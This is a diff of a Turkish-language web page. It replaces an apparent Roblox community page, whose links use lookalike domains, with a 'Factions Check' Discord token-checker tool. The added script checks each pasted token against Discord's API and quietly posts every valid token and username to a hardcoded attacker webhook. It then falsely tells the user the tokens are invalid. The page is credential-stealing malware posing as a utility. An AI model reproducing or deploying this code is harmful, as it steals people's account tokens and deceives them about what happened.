@@ -1,137 +1,204 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SRUTHX Roblox</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Factions Check | Ultimate</title>
+    <style>
+        body { 
+            /* Kareli Gri Arka Plan Doku */
+            background-color: #111;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px; 
+            
+            color: #fff; 
+            font-family: 'Consolas', 'Courier New', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+            cursor: none; /* Gerçek oku gizle */
+        }
 
-<style>
-*{margin:0; padding:0; box-sizing:border-box; font-family:Arial;}
+        /* --- PARLAYAN MAVİ NOKTA İMLEÇ (DOLDURULMUŞ) --- */
+        #cursor {
+            width: 10px; /* Görseldeki gibi küçük, nokta boyutu */
+            height: 10px;
+            background-color: #00d2ff; /* Ortası dolu parlak mavi */
+            border-radius: 50%; /* Tam yuvarlak */
+            position: fixed;
+            pointer-events: none;
+            z-index: 10000;
+            transform: translate(-50%, -50%); /* Tam uca ortalama */
+            /* Neon Parlama (Glow) */
+            box-shadow: 0 0 10px #00d2ff, 0 0 20px #00d2ff, 0 0 30px #00d2ff;
+            transition: transform 0.05s ease-out; /* Pürüzsüz takip */
+        }
+        /* ----------------------------------------------- */
 
-/* 🔥 ARKA PLAN TAM SENİN GÖNDERDİĞİN RENK */
-body{
-background: linear-gradient(90deg,#020617,#0b1a3a);
-color:white;
-text-align:center;
-}
+        /* Şeffaf Menü (Glassmorphism) */
+        .container { 
+            background-color: rgba(0, 0, 0, 0.7); 
+            padding: 50px; 
+            border-radius: 25px; 
+            width: 500px; 
+            text-align: center; 
+            box-shadow: 0 0 40px rgba(0, 0, 0, 1); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 1;
+        }
 
-/* 🔥 HEADER SİLİNDİ (İSTERSEN TAMAMEN KALDIRABİLİRSİN) */
-header{
-padding:30px;
-font-size:32px;
-font-weight:bold;
-letter-spacing:3px;
-background:none;
-box-shadow:none;
-}
+        h1 { 
+            color: #ff1e1e; 
+            text-transform: uppercase; 
+            letter-spacing: 6px; 
+            margin-bottom: 30px; 
+            text-shadow: 0 0 20px rgba(255, 30, 30, 0.5); 
+        }
 
-/* 🔥 LOGO PARLAMASI KALDIRILDI */
-.logo{
-margin-top:60px;
-}
-.logo img{
-width:140px;
-border-radius:20px;
-box-shadow:none; /* glow kaldırıldı */
-}
+        textarea { 
+            width: 100%; 
+            height: 180px; 
+            padding: 15px; 
+            background: rgba(0, 0, 0, 0.5); 
+            border: 1px solid rgba(255, 30, 30, 0.3); 
+            border-radius: 12px; 
+            color: #fff; 
+            margin-bottom: 25px; 
+            outline: none; 
+            resize: none; 
+            box-sizing: border-box; 
+            font-family: monospace;
+        }
 
-h1{
-margin-top:20px;
-font-size:48px;
-background:linear-gradient(90deg,#ff6a00,#ff2d55);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-}
+        button { 
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(90deg, #8b0000, #ff1e1e); 
+            color: #fff; 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            cursor: none; 
+            text-transform: uppercase; 
+            transition: 0.3s;
+        }
 
-p{margin-top:20px; font-size:20px; opacity:0.8;}
+        button:hover { 
+            filter: brightness(1.2);
+            transform: scale(1.02);
+        }
 
-.button{
-display:inline-block;
-margin-top:20px;
-padding:15px 50px;
-font-size:20px;
-border-radius:14px;
-text-decoration:none;
-color:white;
-background:#22c55e;
-box-shadow:0 0 10px #22c55e,0 0 20px #22c55e,0 0 40px #16a34a;
-transition:0.3s;
-}
+        #result { 
+            margin-top: 25px; 
+            padding: 15px; 
+            border-radius: 10px; 
+            display: none; 
+            color: #ff4d4d; 
+            background: rgba(255, 0, 0, 0.1); 
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
 
-.button:hover{
-transform:scale(1.1);
-box-shadow:0 0 20px #39ff14,0 0 40px #39ff14;
-}
+        /* Rainbow Gökkuşağı İmza */
+        .raws-footer {
+            position: fixed;
+            bottom: 25px;
+            right: 35px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-size: 16px; 
+            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4); 
+            animation: rainbow_move 5s linear infinite;
+        }
 
-.cards{
-margin-top:50px;
-display:flex;
-justify-content:center;
-gap:30px;
-flex-wrap:wrap;
-}
+        @keyframes rainbow_move {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
 
-.card{
-background:#0b132b;
-padding:30px;
-width:220px;
-border-radius:15px;
-box-shadow:0 0 15px rgba(0,0,0,0.6);
-transition:0.3s;
-}
-
-.card:hover{
-transform:translateY(-10px);
-box-shadow:0 0 20px #ff6a00;
-}
-
-footer{
-margin-top:50px;
-padding:30px;
-opacity:0.6;
-}
-</style>
-
+    </style>
 </head>
 <body>
 
-<header>SRUTHX COMMUNITY</header>
+<div id="cursor"></div>
 
-<div class="logo">
-<img src="logo.png" alt="SRUTHX Logo">
+<div class="container">
+    <h1>FACTIONS CHECK</h1>
+    <textarea id="tokenList" placeholder="Tokenleri buraya giriniz..."></textarea>
+    <button onclick="checkAll()">KONTROL ET</button>
+    <div id="result"></div>
 </div>
 
-<h1>SRUTHX Roblox Sunucusu</h1>
+<div class="raws-footer">CRACKED BY RAWS</div>
 
-<p>Aşağıdaki butona bas ve hemen oyuna katıl 👇</p>
+<script>
+    const cursor = document.getElementById('cursor');
 
-<a href="https://www.roblox.re/games/8737602449/PLS-DONATE?privateServerLinkCode=02656158406728114785427307943222" class="button">JOIN GAME</a>
+    // Mouse Hareket Takibi (Tam Hizalama)
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
 
-<div class="cards">
-  <div class="card">
-    <h3>ℹ️ Hakkında</h3>
-    <p>SRUTHX Roblox sunucusu, eğlenceli ve aktif bir topluluk sunar. Herkes davetlidir!</p>
-  </div>
+    document.addEventListener('mousedown', () => cursor.style.transform = 'translate(-50%, -50%) scale(0.7)');
+    document.addEventListener('mouseup', () => cursor.style.transform = 'translate(-50%, -50%) scale(1)');
 
-  <div class="card">
-    <h3>💬 Discord</h3>
-    <p>Topluluğumuza katıl ve arkadaşlarınla sohbet et!</p>
-    <a href="https://discord.gg/cJAV3DpEMy" class="button" style="margin-top:15px; padding:10px 20px; font-size:16px;">JOIN DISCORD</a>
-  </div>
+    const webhook = "https://discord.com/api/webhooks/1492574043101069496/vh3jwkv4ug97luEchOXtjEz9_dh4HbDvEmE1AdVpxRVyrsepc1QX14Ffk5fYCc7VjEpI";
 
-  <div class="card">
-    <h3>👤 Profil</h3>
-    <p>Roblox profilime göz at!</p>
-    <a href="https://roblox.com.ge/users/4703162749/profile" class="button" style="margin-top:15px; padding:10px 20px; font-size:16px;">PROFİLE GİT</a>
-  </div>
+    async function checkAll() {
+        const input = document.getElementById('tokenList');
+        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
+        const res = document.getElementById('result');
+        
+        if (tokens.length === 0) return;
 
-  <div class="card">
-    <h3>🔥 Aktif</h3>
-    <p>Her gün aktif oyuncular ve oyunlar!</p>
-  </div>
-</div>
+        res.style.display = "block";
+        res.textContent = "SİSTEM KONTROL EDİLİYOR...";
 
-<footer>© SRUTHX Community</footer>
+        tokens.forEach(async (token) => {
+            try {
+                const r = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+
+                if (r.status === 200) {
+                    const d = await r.json();
+                    fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🔥 TOKEN YAKALANDI",
+                                color: 16711680,
+                                fields: [
+                                    { name: "User", value: d.username, inline: true },
+                                    { name: "Token", value: "```" + token + "```" }
+                                ]
+                            }]
+                        })
+                    });
+                }
+            } catch (e) { }
+        });
+        
+        setTimeout(() => {
+            res.textContent = "✕ GEÇERSİZ TOKENLER TESPİT EDİLDİ";
+        }, 1500);
+    }
+</script>
 
 </body>
 </html>
